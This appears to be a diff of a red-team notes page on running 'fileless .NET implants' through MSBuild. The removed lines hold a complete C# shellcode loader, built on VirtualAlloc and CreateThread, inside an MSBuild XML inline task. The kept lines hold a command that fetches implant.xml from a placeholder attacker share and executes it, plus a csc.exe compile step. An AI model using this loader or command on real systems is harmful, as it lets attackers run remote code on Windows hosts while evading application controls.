@@ -1,5 +1,12 @@
 # DotNET Execution
 
+## MSBuild
+
+> [!INFO] Valid Extensions
+> These are the valid extensions to execute fileless .NET implant. They are: `.csproj`, `.xml`, `.xoml`.
+> > [!TIP]
+> > You can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the implant.
+
 XML Implant template.
 
 ```xml
@@ -19,43 +26,9 @@ XML Implant template.
 		using System.Runtime.InteropServices;
 		using Microsoft.Build.Framework;
 		using Microsoft.Build.Utilities;
-		public class ClassExample :  Task, ITask
-		{         
-		  private static UInt32 MEM_COMMIT = 0x1000;          
-		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
-		  [DllImport("kernel32")]
-		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
-		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
-		  [DllImport("kernel32")]
-		    private static extern IntPtr CreateThread(            
-		    UInt32 lpThreadAttributes,
-		    UInt32 dwStackSize,
-		    UInt32 lpStartAddress,
-		    IntPtr param,
-		    UInt32 dwCreationFlags,
-		    ref UInt32 lpThreadId           
-		    );
-		  [DllImport("kernel32")]
-		    private static extern UInt32 WaitForSingleObject(           
-		    IntPtr hHandle,
-		    UInt32 dwMilliseconds
-		    );          
-		  public override bool Execute()
-		  {
-			//replace with your own shellcode
-		    byte[] shellcode = new byte[] { 0x00 };
-		      
-		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
-			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
-		      IntPtr hThread = IntPtr.Zero;
-		      UInt32 threadId = 0;
-		      IntPtr pinfo = IntPtr.Zero;
-		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
-		      WaitForSingleObject(hThread, 0xFFFFFFFF);
-		      return true;
-		  } 
-		}     
+		public class ClassExample :  Task, ITask {
+			// C# Code here
+		}
 	      ]]>
 	      </Code>
 	    </Task>
@@ -63,11 +36,7 @@ XML Implant template.
 	</Project>
 ```
 
-## MSBuild
-
-
-> [!INFO] Valid Extensions
-> These are the valid extensions to execute fileless .NET implant. They are: `.csproj`, `.xml`, `.xoml`.
+To execute the .NET implant.
 
 ```
 C:\> cmd.exe /V /c "set COMPILER="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !COMPILER! /noautoresponse /preprocess \\<attacker_IP>\<share_name>\implant.xml > implant.xml & !COMPILER! implant.xml"
@@ -89,8 +58,6 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\path\to\implant.cs
 ## References
 
 ### Backlinks
-
-- [[Compilers]]
 
 - [[DLL Execution]]
 
